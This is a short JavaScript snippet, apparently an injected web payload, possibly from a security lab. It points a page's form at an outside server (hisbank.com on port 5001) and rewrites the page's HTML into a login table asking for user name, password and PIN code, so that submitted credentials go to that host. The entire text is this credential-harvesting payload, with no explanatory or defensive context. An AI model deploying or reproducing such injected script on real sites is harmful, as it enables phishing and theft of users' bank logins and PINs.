form = document.getElementById('form_id');
form.action = 'http://hisbank.com:5001/login';

table = document.getElementById('login_id')
table.innerHTML = `<table>
            <tr>
                <td>User Name:</td>
                <td><input name="username" id="username" type="text"></td>
            </tr>
            <tr>
                <td>Password:</td>
                <td><input name="password" id="password" type="password"></td>
            </tr>
            <tr>
                <td>Pin code:</td>
                <td><input name="pin" id="pin" type="password"></td>
            </tr>
            <tr>
                <td><input name="chkbox" id="chkbox" type="checkbox"></td>
                <td><label for="chkbox">remember me</label></td>
            </tr>
            <tr>
                <td><input type="submit" value="Submit"></td>
            </tr>
        </table>`;